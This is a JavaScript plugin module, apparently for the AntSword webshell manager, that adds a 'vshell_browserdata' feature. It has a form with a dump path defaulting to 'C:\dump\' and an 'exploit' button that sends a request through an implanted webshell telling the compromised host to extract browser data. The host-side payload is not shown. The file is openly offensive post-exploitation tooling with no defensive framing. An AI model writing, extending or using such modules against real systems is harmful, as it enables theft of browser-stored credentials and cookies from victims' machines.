"use strict";

const Base = require("../base");
const LANG = require("../../language"); // 插件语言库
const LANG_T = antSword["language"]["toastr"]; // 通用通知提示
class Exploit extends Base {
  createForm(cell) {
    var str = [
      {
        type: "label",
        label: LANG["core"]["vshell_browserdata"]["support"],
      },
      {
        type: "input",
        name: "path",
        label: LANG["core"]["vshell_browserdata"]["form"]["path"],
        labelWidth: 100,
        value: "C:\\dump\\",
        labelAlign:"center",
        inputWidth: 300,
        required: true,
      },
      {
        type: "label",
        label: LANG["core"]["vshell_browserdata"]["msg"],
      },
    ];
    var form = cell.attachForm(str);
    this.form = form;
  }
  createToolbar(cell) {
    let self = this;
    let toolbar = cell.attachToolbar();
    this.toolbar = toolbar;
    toolbar.attachEvent("onClick", function (id) {
      if (self.precheck() == false) {
        toastr.error(LANG["precheck"]["not_support"], LANG_T["error"]);
        return;
      }
      console.log(id);
      switch (id) {
        case "exploit":
          try {
            self.Exploit();
          } catch (e) {
            toastr.error(
              e.constructor === Object ? JSON.stringify(e) : e,
              LANG_T["error"]
            );
          }
          break;
        default:
          break;
      }
    });
    toolbar.loadStruct(
      '<toolbar><item type="button" id="exploit" text="'+LANG["core"]["vshell_browserdata"]["toolbar"]["getdata"]+'" img="" /><item type="separator" id="separator" /></toolbar>',
      function () {}
    );
  }
  Exploit() {
    let self = this;
    self.core = this.top.core;
    let path = this.form.getItemValue("path");
    let data = {
      _: "HB",
      "z1" : path
    };
    self.core
      .request(data)
      .then((_ret) => {
        let res = antSword.unxss(_ret["text"], false);
        if (res === "") {
          res = "output is empty.";
        }
        if (res.indexOf("ERROR://") > -1) {
          throw res;
        }
        this.editor.session.setValue(res);
        this.editor.setReadOnly(true);
        toastr.success(LANG["success"], LANG_T["success"]);
      })
      .catch((e) => {
        console.log(e);
        toastr.error(e.constructor === Object ? JSON.stringify(e) : e, "Error");
      });
  }
}
module.exports = Exploit;
